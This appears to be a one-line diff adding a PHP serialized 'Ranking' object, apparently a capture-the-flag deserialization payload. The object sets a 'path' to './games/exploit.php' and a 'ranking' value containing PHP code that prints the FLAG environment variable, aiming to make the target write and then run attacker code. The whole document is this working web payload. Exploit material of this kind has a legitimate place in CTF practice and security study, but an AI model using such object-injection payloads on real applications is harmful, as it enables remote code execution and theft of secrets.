@@ -1,0 +1,1 @@
+O:7:"Ranking":3:{s:7:"ranking";s:28:"<?php echo getenv('FLAG');?>";s:7:"changed";b:1;s:4:"path";s:19:"./games/exploit.php";}
